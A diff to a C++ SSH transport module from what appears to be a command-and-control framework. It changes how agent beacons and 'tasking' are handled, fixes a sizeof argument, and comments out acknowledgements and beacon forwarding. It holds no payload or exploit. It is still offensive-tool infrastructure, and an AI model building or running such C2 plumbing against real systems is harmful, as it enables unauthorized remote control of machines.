@@ -144,7 +144,7 @@ int SshTransport::Authenticate(){
                             strncpy(auth_struct->passwd, ssh_message_auth_password(message), 64);
 
                             // send tasking to server and await tasking report
-                            ptask_t send = p_ref->CreateTasking(0, TASK_AUTH, sizeof(auth_struct), auth_struct);
+                            ptask_t send = p_ref->CreateTasking(0, TASK_AUTH, sizeof(auth_t), auth_struct);
                             p_ref->PushTasking(send);
 
                             ptask_t auth_success = p_ref->AwaitTask(TASK_AUTH);
@@ -242,33 +242,19 @@ int SshTransport::DetermineHandler(){
     {
     case REQ_TASKING:
         ssh_channel_read(channel, tmp_buffer, 2, 0);
-
+        
         if(tmp_buffer[0] == '9'){
-            ssh_channel_write(channel, "ok", 2);
+            //ssh_channel_write(channel, "ok", 2);
             return MANAG_TYPE;
 
         } else {
             // Send OK
-            rc = ssh_channel_write(channel, "ok", 3);
+            //rc = ssh_channel_write(channel, "ok", 3);
             if(rc == SSH_ERROR){
                 printf("Client %s: caught ssh error: %s", agent_name, ssh_get_error(session));
                 api_return{API_ERR_GENERIC, (void*)ssh_get_error(session)};
             }
             
-            // read the beacon
-            rc = ssh_channel_read(channel, beacon, sizeof(beacon), 0);
-            if(rc == SSH_ERROR){
-                printf("Client %s: caught ssh error: %s", agent_name, ssh_get_error(session));
-                api_return{API_ERR_GENERIC, (void *) ssh_get_error(session)};
-            }
-
-            printf("%s", beacon);
-            
-            // push the beacon data for the server to handle and write
-            ptask_t send = p_ref->CreateTasking(0, TASK_PUSH_BEACON, sizeof(beacon), beacon);
-            p_ref->PushTasking(send);
-            p_ref->AwaitTask(TASK_PUSH_BEACON);
-
             /* NOTE: THIS NEEDS TO MOVE */
 ////////////////////////////////////////////////////////////////////////////////
             //memset(buf, 0, sizeof(buf));
